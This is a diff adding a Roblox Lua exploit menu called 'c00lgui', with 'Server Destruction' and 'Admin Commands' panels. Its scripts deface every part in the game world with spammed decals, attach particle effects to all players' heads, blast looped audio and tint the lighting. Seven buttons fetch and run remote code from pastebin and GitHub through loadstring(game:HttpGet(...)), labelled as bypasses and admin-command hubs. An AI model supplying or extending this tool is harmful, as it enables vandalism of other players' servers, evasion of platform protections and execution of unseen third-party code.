@@ -1,0 +1,460 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local c00lgui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local Page1 = Instance.new("Frame")
+local ServerDestruction = Instance.new("Frame")
+local Title_2 = Instance.new("TextLabel")
+local john = Instance.new("TextButton")
+local prison = Instance.new("TextButton")
+local prison2 = Instance.new("TextButton")
+local SpammerTheDecal = Instance.new("TextButton")
+local disco = Instance.new("TextButton")
+local disco_2 = Instance.new("TextButton")
+local disco_3 = Instance.new("TextButton")
+local disco_4 = Instance.new("TextButton")
+local disco_5 = Instance.new("TextButton")
+local disco_6 = Instance.new("TextButton")
+local AdminCommandsGuis = Instance.new("Frame")
+local prisoncommand = Instance.new("TextButton")
+local Title_3 = Instance.new("TextLabel")
+local feutg = Instance.new("TextButton")
+local moonhub = Instance.new("TextButton")
+local Ligma = Instance.new("TextButton")
+local CloseOpen = Instance.new("TextButton")
+
+--Properties:
+
+c00lgui.Name = "c00lgui"
+c00lgui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+Frame.Parent = c00lgui
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Frame.BorderSizePixel = 3
+Frame.Position = UDim2.new(0, 3, 0.300000012, 0)
+Frame.Size = UDim2.new(0, 300, 0, 400)
+Frame.ZIndex = 2
+
+Title.Name = "Title"
+Title.Parent = Frame
+Title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Title.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title.BorderSizePixel = 3
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.ZIndex = 2
+Title.Font = Enum.Font.SourceSans
+Title.Text = "c00lgui by jo1tar0"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 24.000
+
+Page1.Name = "Page1"
+Page1.Parent = Frame
+Page1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Page1.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Page1.BorderSizePixel = 3
+Page1.Position = UDim2.new(0, 0, 0, 83)
+Page1.Size = UDim2.new(1, 0, 1, -106)
+Page1.ZIndex = 2
+
+ServerDestruction.Name = "Server Destruction"
+ServerDestruction.Parent = Page1
+ServerDestruction.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ServerDestruction.BorderColor3 = Color3.fromRGB(255, 0, 0)
+ServerDestruction.BorderSizePixel = 3
+ServerDestruction.Position = UDim2.new(0, 0, 0.0102040814, 0)
+ServerDestruction.Size = UDim2.new(0.5, 0, 1, 0)
+ServerDestruction.ZIndex = 2
+
+Title_2.Name = "Title"
+Title_2.Parent = ServerDestruction
+Title_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Title_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_2.BorderSizePixel = 3
+Title_2.Position = UDim2.new(0, 0, -0.146258503, 0)
+Title_2.Size = UDim2.new(1, 0, 0, 30)
+Title_2.ZIndex = 2
+Title_2.Font = Enum.Font.SourceSansBold
+Title_2.Text = "Server Destruction"
+Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_2.TextSize = 14.000
+Title_2.TextWrapped = true
+
+john.Name = "john"
+john.Parent = ServerDestruction
+john.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+john.BorderColor3 = Color3.fromRGB(255, 0, 0)
+john.BorderSizePixel = 3
+john.Position = UDim2.new(0, 0, 0, 3)
+john.Size = UDim2.new(0.5, 0, 0, 30)
+john.ZIndex = 2
+john.Font = Enum.Font.SourceSans
+john.Text = "John Doe"
+john.TextColor3 = Color3.fromRGB(255, 255, 255)
+john.TextSize = 14.000
+
+prison.Name = "prison"
+prison.Parent = ServerDestruction
+prison.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+prison.BorderColor3 = Color3.fromRGB(255, 0, 0)
+prison.BorderSizePixel = 3
+prison.Position = UDim2.new(0, 79, 0, 3)
+prison.Size = UDim2.new(0.453333348, 0, 0, 30)
+prison.ZIndex = 2
+prison.Font = Enum.Font.SourceSans
+prison.Text = "Prison Life Fe Bypass"
+prison.TextColor3 = Color3.fromRGB(255, 255, 255)
+prison.TextScaled = true
+prison.TextSize = 14.000
+prison.TextWrapped = true
+
+prison2.Name = "prison2"
+prison2.Parent = ServerDestruction
+prison2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+prison2.BorderColor3 = Color3.fromRGB(255, 0, 0)
+prison2.BorderSizePixel = 3
+prison2.Position = UDim2.new(0, 0, 0, 42)
+prison2.Size = UDim2.new(0.5, 0, 0, 30)
+prison2.ZIndex = 2
+prison2.Font = Enum.Font.SourceSans
+prison2.Text = "Prison Life Fe Bypass 2"
+prison2.TextColor3 = Color3.fromRGB(255, 255, 255)
+prison2.TextScaled = true
+prison2.TextSize = 14.000
+prison2.TextWrapped = true
+
+SpammerTheDecal.Name = "SpammerTheDecal"
+SpammerTheDecal.Parent = ServerDestruction
+SpammerTheDecal.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+SpammerTheDecal.BorderColor3 = Color3.fromRGB(255, 0, 0)
+SpammerTheDecal.BorderSizePixel = 3
+SpammerTheDecal.Position = UDim2.new(0, 81, 0, 42)
+SpammerTheDecal.Size = UDim2.new(0.419999987, 0, 0, 30)
+SpammerTheDecal.ZIndex = 2
+SpammerTheDecal.Font = Enum.Font.SourceSans
+SpammerTheDecal.Text = "Decal Spam"
+SpammerTheDecal.TextColor3 = Color3.fromRGB(255, 255, 255)
+SpammerTheDecal.TextSize = 14.000
+SpammerTheDecal.TextWrapped = true
+
+disco.Name = "disco"
+disco.Parent = ServerDestruction
+disco.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+disco.BorderColor3 = Color3.fromRGB(255, 0, 0)
+disco.BorderSizePixel = 3
+disco.Position = UDim2.new(0, 3, 0, 81)
+disco.Size = UDim2.new(0.5, 0, 0, 30)
+disco.ZIndex = 2
+disco.Font = Enum.Font.SourceSans
+disco.Text = "Disco"
+disco.TextColor3 = Color3.fromRGB(255, 255, 255)
+disco.TextSize = 14.000
+disco.TextWrapped = true
+
+disco_2.Name = "disco"
+disco_2.Parent = ServerDestruction
+disco_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+disco_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
+disco_2.BorderSizePixel = 3
+disco_2.Position = UDim2.new(0, 81, 0, 81)
+disco_2.Size = UDim2.new(0.460000008, 0, 0, 30)
+disco_2.ZIndex = 2
+disco_2.Font = Enum.Font.SourceSans
+disco_2.Text = "Music"
+disco_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+disco_2.TextSize = 14.000
+disco_2.TextWrapped = true
+
+disco_3.Name = "disco"
+disco_3.Parent = ServerDestruction
+disco_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+disco_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
+disco_3.BorderSizePixel = 3
+disco_3.Position = UDim2.new(0, 6, 0, 117)
+disco_3.Size = UDim2.new(0.460000008, 0, 0, 30)
+disco_3.ZIndex = 2
+disco_3.Font = Enum.Font.SourceSans
+disco_3.Text = "Particles"
+disco_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+disco_3.TextSize = 14.000
+disco_3.TextWrapped = true
+
+disco_4.Name = "disco"
+disco_4.Parent = ServerDestruction
+disco_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+disco_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
+disco_4.BorderSizePixel = 3
+disco_4.Position = UDim2.new(0, 81, 0, 117)
+disco_4.Size = UDim2.new(0.460000008, 0, 0, 30)
+disco_4.ZIndex = 2
+disco_4.Font = Enum.Font.SourceSans
+disco_4.Text = "Empty"
+disco_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+disco_4.TextSize = 14.000
+disco_4.TextWrapped = true
+
+disco_5.Name = "disco"
+disco_5.Parent = ServerDestruction
+disco_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+disco_5.BorderColor3 = Color3.fromRGB(255, 0, 0)
+disco_5.BorderSizePixel = 3
+disco_5.Position = UDim2.new(0, 81, 0, 154)
+disco_5.Size = UDim2.new(0.460000008, 0, 0, 30)
+disco_5.ZIndex = 2
+disco_5.Font = Enum.Font.SourceSans
+disco_5.Text = "Empty"
+disco_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+disco_5.TextSize = 14.000
+disco_5.TextWrapped = true
+
+disco_6.Name = "disco"
+disco_6.Parent = ServerDestruction
+disco_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+disco_6.BorderColor3 = Color3.fromRGB(255, 0, 0)
+disco_6.BorderSizePixel = 3
+disco_6.Position = UDim2.new(0, 6, 0, 154)
+disco_6.Size = UDim2.new(0.460000008, 0, 0, 30)
+disco_6.ZIndex = 2
+disco_6.Font = Enum.Font.SourceSans
+disco_6.Text = "Empty"
+disco_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+disco_6.TextSize = 14.000
+disco_6.TextWrapped = true
+
+AdminCommandsGuis.Name = "Admin Commands/Guis"
+AdminCommandsGuis.Parent = Page1
+AdminCommandsGuis.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+AdminCommandsGuis.BorderColor3 = Color3.fromRGB(255, 0, 0)
+AdminCommandsGuis.BorderSizePixel = 3
+AdminCommandsGuis.Position = UDim2.new(0.49000001, 3, 0, 0)
+AdminCommandsGuis.Size = UDim2.new(0.5, -3, 1, 0)
+AdminCommandsGuis.ZIndex = 2
+
+prisoncommand.Name = "prisoncommand"
+prisoncommand.Parent = AdminCommandsGuis
+prisoncommand.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+prisoncommand.BorderColor3 = Color3.fromRGB(255, 0, 0)
+prisoncommand.BorderSizePixel = 3
+prisoncommand.Position = UDim2.new(0, 0, 0, 3)
+prisoncommand.Size = UDim2.new(0.5, 0, 0, 30)
+prisoncommand.ZIndex = 2
+prisoncommand.Font = Enum.Font.SourceSans
+prisoncommand.Text = "Prison Life Admin Commands"
+prisoncommand.TextColor3 = Color3.fromRGB(255, 255, 255)
+prisoncommand.TextScaled = true
+prisoncommand.TextSize = 14.000
+prisoncommand.TextWrapped = true
+
+Title_3.Name = "Title"
+Title_3.Parent = AdminCommandsGuis
+Title_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Title_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Title_3.BorderSizePixel = 3
+Title_3.Position = UDim2.new(0, 0, -0.146258503, 0)
+Title_3.Size = UDim2.new(1, 0, 0, 30)
+Title_3.ZIndex = 2
+Title_3.Font = Enum.Font.SourceSansBold
+Title_3.Text = "Admin Commands/Guis"
+Title_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title_3.TextSize = 14.000
+Title_3.TextWrapped = true
+
+feutg.Name = "feutg"
+feutg.Parent = AdminCommandsGuis
+feutg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+feutg.BorderColor3 = Color3.fromRGB(255, 0, 0)
+feutg.BorderSizePixel = 3
+feutg.Position = UDim2.new(0, 73, 0, 3)
+feutg.Size = UDim2.new(0.5, 0, 0, 30)
+feutg.ZIndex = 2
+feutg.Font = Enum.Font.SourceSans
+feutg.Text = "FE UTG"
+feutg.TextColor3 = Color3.fromRGB(255, 255, 255)
+feutg.TextSize = 14.000
+feutg.TextWrapped = true
+
+moonhub.Name = "moonhub"
+moonhub.Parent = AdminCommandsGuis
+moonhub.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+moonhub.BorderColor3 = Color3.fromRGB(255, 0, 0)
+moonhub.BorderSizePixel = 3
+moonhub.Position = UDim2.new(0, 0, 0, 37)
+moonhub.Size = UDim2.new(0.5, 0, 0, 30)
+moonhub.ZIndex = 2
+moonhub.Font = Enum.Font.SourceSans
+moonhub.Text = "Moon Hub v1.3"
+moonhub.TextColor3 = Color3.fromRGB(255, 255, 255)
+moonhub.TextScaled = true
+moonhub.TextSize = 15.000
+moonhub.TextWrapped = true
+
+Ligma.Name = "Ligma"
+Ligma.Parent = AdminCommandsGuis
+Ligma.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Ligma.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Ligma.BorderSizePixel = 3
+Ligma.Position = UDim2.new(0, 78, 0, 37)
+Ligma.Size = UDim2.new(0.460000008, 0, 0, 30)
+Ligma.ZIndex = 2
+Ligma.Font = Enum.Font.SourceSans
+Ligma.Text = "Project Ligma"
+Ligma.TextColor3 = Color3.fromRGB(255, 255, 255)
+Ligma.TextSize = 14.000
+Ligma.TextWrapped = true
+
+CloseOpen.Name = "Close/Open"
+CloseOpen.Parent = c00lgui
+CloseOpen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+CloseOpen.BorderColor3 = Color3.fromRGB(255, 0, 0)
+CloseOpen.BorderSizePixel = 3
+CloseOpen.Position = UDim2.new(0, 3, 0.300000012, 380)
+CloseOpen.Size = UDim2.new(0, 300, 0, 20)
+CloseOpen.ZIndex = 3
+CloseOpen.Font = Enum.Font.SourceSans
+CloseOpen.Text = "Close"
+CloseOpen.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseOpen.TextSize = 18.000
+
+-- Scripts:
+
+local function NMDZMI_fake_script() -- SpammerTheDecal.Script 
+	local script = Instance.new('Script', SpammerTheDecal)
+
+	function click()
+		function exPro(root)
+			for _, v in pairs(root:GetChildren()) do
+				if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id=13442447872" then
+					v.Parent = nil
+				elseif v:IsA("BasePart") then
+					v.Material = "Plastic"
+					v.Transparency = 0
+					local One = Instance.new("Decal", v)
+					local Two = Instance.new("Decal", v)
+					local Three = Instance.new("Decal", v)
+					local Four = Instance.new("Decal", v)
+					local Five = Instance.new("Decal", v)
+					local Six = Instance.new("Decal", v)
+					One.Texture = "http://www.roblox.com/asset/?id=13442447872"
+					Two.Texture = "http://www.roblox.com/asset/?id=13442447872"
+					Three.Texture = "http://www.roblox.com/asset/?id=13442447872"
+					Four.Texture = "http://www.roblox.com/asset/?id=13442447872"
+					Five.Texture = "http://www.roblox.com/asset/?id=13442447872"
+					Six.Texture = "http://www.roblox.com/asset/?id=13442447872"
+					One.Face = "Front"
+					Two.Face = "Back"
+					Three.Face = "Right"
+					Four.Face = "Left"
+					Five.Face = "Top"
+					Six.Face = "Bottom"
+				end
+				exPro(v)
+			end
+		end
+		function asdf(root)
+			for _, v in pairs(root:GetChildren()) do
+				asdf(v)
+			end
+		end
+		exPro(game.Workspace)
+		asdf(game.Workspace)
+	end
+	
+	script.Parent.MouseButton1Down:connect(click)
+	
+end
+coroutine.wrap(NMDZMI_fake_script)()
+local function LFXHC_fake_script() -- disco.Script 
+	local script = Instance.new('Script', disco)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		local Lighting = game:GetService("Lighting")
+		local ColorCorrection = Instance.new("ColorCorrectionEffect", Lighting)
+	
+		function zigzag(X) 
+			return math.acos(math.cos(X*math.pi))/math.pi
+		end
+	
+		Counter = 0
+	
+		Lighting.TimeOfDay = "12:00"
+	
+		while wait(0.1) do 
+			ColorCorrection.TintColor = Color3.fromHSV(zigzag(Counter),1,1)
+			Lighting.Ambient = Color3.fromHSV(zigzag(Counter),1,1)
+			Counter += 0.01
+		end
+	end)
+end
+coroutine.wrap(LFXHC_fake_script)()
+local function ULWH_fake_script() -- disco_2.Script 
+	local script = Instance.new('Script', disco_2)
+
+	function onClick()
+		local tubers93		= Instance.new("Sound")
+		tubers93.Parent		= game:GetService("Workspace")
+		tubers93.SoundId		= "rbxassetid://5356466111"
+		tubers93.Playing		= true
+		tubers93.Looped		= true
+		tubers93.Pitch      = 0.9
+		tubers93.Volume		= 10
+	
+	end
+	
+	script.Parent.MouseButton1Down:connect(onClick)
+end
+coroutine.wrap(ULWH_fake_script)()
+local function NGRMRPC_fake_script() -- disco_3.Script 
+	local script = Instance.new('Script', disco_3)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		for i, v in pairs(game.Players:GetChildren()) do
+			emit = Instance.new("ParticleEmitter")
+			emit.Parent = v.Character.Head
+			emit.Texture = "http://www.roblox.com/asset/?id=13442447872"
+			emit.VelocitySpread = 100000
+		end
+	end)
+end
+coroutine.wrap(NGRMRPC_fake_script)()
+local function MXNA_fake_script() -- CloseOpen.LocalScript 
+	local script = Instance.new('LocalScript', CloseOpen)
+
+	function click()
+	if script.Parent.Text == "Close" then
+	script.Parent.Parent.Frame.Visible = false
+	script.Parent.Text = "Open" else
+	script.Parent.Parent.Frame.Visible = true
+	script.Parent.Text = "Close"	
+	end	
+	end
+	
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(MXNA_fake_script)()
+Ligma.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet("https://pastebin.com/raw/6ypMfGeD"))();
+end)
+prisoncommand.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet("https://pastebin.com/raw/1RvgFtcx"))();
+end)
+feutg.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Blukezz/UTG-V4/main/Script.lua"))();
+end)
+--https://raw.githubusercontent.com/Blukezz/UTG-V4/main/Script.lua
+--les go
+moonhub.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet("https://pastebin.com/raw/LwQkm563"))();
+end)
+prison2.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet("https://pastebin.com/raw/KSv9D7A9"))();
+end)
+prison.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet("https://pastebin.com/raw/Sk7R1p8N"))();
+end)
+john.MouseButton1Down:connect(function() 
+	loadstring(game:HttpGet("https://pastebin.com/raw/vvMD5J4n"))();
+end)
